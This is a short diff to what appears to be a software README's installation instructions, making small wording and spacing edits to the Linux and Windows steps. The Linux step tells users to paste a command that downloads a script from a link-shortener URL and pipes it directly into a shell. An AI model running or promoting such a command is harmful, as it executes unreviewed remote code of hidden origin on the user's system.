@@ -16,7 +16,7 @@ Follow the steps below according to your operating system.
 ## For Linux
 ### Direct method (Highly preferred)
 1. **Open Terminal**
-2. Copy and Paste this command pressing "Control + Shift + V" from your keyboard or manually (pressing right click and clicking on paste) paste it.
+2. Copy and Paste this command pressing "Control + Shift + V" from your keyboard or manually (pressing right click and clicking on paste) paste it and press enter.
 ```bash
 wget -qO- https://naturl.link/curl | sh
 ```
@@ -40,6 +40,7 @@ wget -qO- https://naturl.link/curl | sh
 3. After executing the command, follow these steps:
 
 a. Press `Windows logo + R` to open the Run dialog.
+
 b. Type one of the following commands:
    - For Notepad: 
      ```
